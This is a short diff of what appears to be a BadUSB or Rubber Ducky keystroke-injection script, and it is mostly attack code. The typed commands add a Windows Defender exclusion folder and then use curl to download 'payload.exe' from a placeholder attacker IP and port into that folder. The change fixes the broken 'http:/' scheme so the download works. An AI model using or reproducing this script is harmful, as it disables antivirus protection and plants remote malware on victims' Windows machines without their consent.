@@ -21,7 +21,7 @@ ENTER
 STRING Add-MpPreference -ExclusionPath 'C:\folder of your choice' ### change me ###
 ENTER
 DELAY 500
-STRING curl http:/<---IP---->:<PORT>/payload.exe -o C:\folder_of_choice\created_payload.exe ### change me ###
+STRING curl http://<---IP---->:<PORT>/payload.exe -o C:\folder_of_choice\created_payload.exe ### change me ###
 ENTER
 DELAY 500
 STRING cd C:\<created folder> 
